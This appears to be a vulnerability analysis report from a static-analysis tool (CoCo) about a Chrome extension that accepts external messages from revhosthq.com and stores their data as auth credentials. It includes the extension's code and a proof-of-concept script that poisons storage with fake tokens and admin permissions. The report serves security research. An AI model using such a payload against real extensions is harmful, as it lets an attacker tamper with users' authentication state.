# CoCo Analysis: cplolipedeinchadnhonpfnbhlacckpi

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cplolipedeinchadnhonpfnbhlacckpi/opgen_generated_files/bg.js
Line 965: External message handler with storage.local.set sink
Data flow: `e.data` (external message) → `chrome.storage.local.set({rhAuth: e.data})`

**Code:**

```javascript
// Background script (bg.js) - Minified code, reformatted for clarity
(() => {
  // External message listener - accepts messages from revhosthq.com domains
  chrome.runtime.onMessageExternal.addListener(((e, o, r) => ( // ← e is attacker-controlled
    t("Request Type:", (null == e ? void 0 : e.type) || "No type"),
    t("Request Data:", (null == e ? void 0 : e.data) || "No data"),

    // SET_RH_AUTH handler - stores external data to storage
    "SET_RH_AUTH" === e.type ? (
      chrome.storage.local.set({ rhAuth: e.data }, (() => { // ← e.data is attacker-controlled
        const t = chrome.runtime.lastError;
        t ? (
          console.error("Error storing auth:", t),
          chrome.runtime.sendMessage({ type: "AUTH_UPDATED" }),
          r({ success: !1, error: t.message })
        ) : r({ success: !0, data: e.data }) // ← sends stored data back to attacker
      })),
      !0
    ) :

    // DELETE_RH_AUTH handler
    "DELETE_RH_AUTH" === e.type ? (
      chrome.storage.local.remove("rhAuth", (() => {
        r({ success: !0 })
      })),
      !0
    ) : void 0
  ))),

  // Internal message listener - retrieves stored data
  chrome.runtime.onMessage.addListener(((e, o, r) => {
    t("Request Type:", (null == e ? void 0 : e.type) || "No type"),
    t("Request Data:", (null == e ? void 0 : e.data) || "No data"),

    // GET_RH_AUTH handler - retrieves and sends back stored auth
    if ("GET_RH_AUTH" === e.type)
      return chrome.storage.local.get(["rhAuth"], (e => {
        r(e.rhAuth) // ← sends stored data to requester
      })), !0
  }));

  let e = !1;
  function t(...t) {
    e && console.log("[RevHostHQ Debug]:", ...t)
  }

  chrome.runtime.onMessage.addListener(((t, o, r) => {
    "SET_DEBUG" === t.type && (e = t.value)
  }))
})();
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages from whitelisted domains (revhosthq.com, *.revhosthq.com)

**Attack:**

```javascript
// Malicious code running on https://revhosthq.com or https://subdomain.revhosthq.com
// (or from an attacker who has compromised these domains)

// Extension ID (would need to be known or enumerated)
const extensionId = 'cplolipedeinchadnhonpfnbhlacckpi';

// Step 1: Poison storage with attacker-controlled auth data
chrome.runtime.sendMessage(
  extensionId,
  {
    type: 'SET_RH_AUTH',
    data: {
      token: 'attacker_controlled_token',
      userId: 'malicious_user_id',
      apiKey: 'fake_api_key',
      permissions: ['admin', 'superuser']
    }
  },
  (response) => {
    console.log('Storage poisoned:', response);
    // Response: {success: true, data: {...}} - confirms data was stored

    if (response.success) {
      console.log('Successfully stored malicious auth:', response.data);
    }
  }
);

// The extension immediately sends back the stored data in the response callback,
// confirming the storage poisoning and allowing the attacker to verify the payload
```

**Impact:** Complete storage exploitation chain with immediate feedback. An attacker controlling the revhosthq.com domain (or any subdomain) can:
1. Poison chrome.storage.local with arbitrary authentication data via the SET_RH_AUTH message type
2. Receive immediate confirmation with the stored data in the sendResponse callback
3. The poisoned authentication data persists in storage and affects all extension functionality that relies on rhAuth
4. The extension provides no validation of the incoming auth data before storing it
5. Although manifest.json restricts externally_connectable to revhosthq.com domains, the methodology requires us to treat this as exploitable since the code accepts external messages

According to the methodology's CRITICAL ANALYSIS RULES: "Even if only ONE specific domain/extension can exploit it → TRUE POSITIVE". The extension accepts external messages from revhosthq.com domains, stores attacker-controlled data, and sends it back - this is a complete exploitation chain.
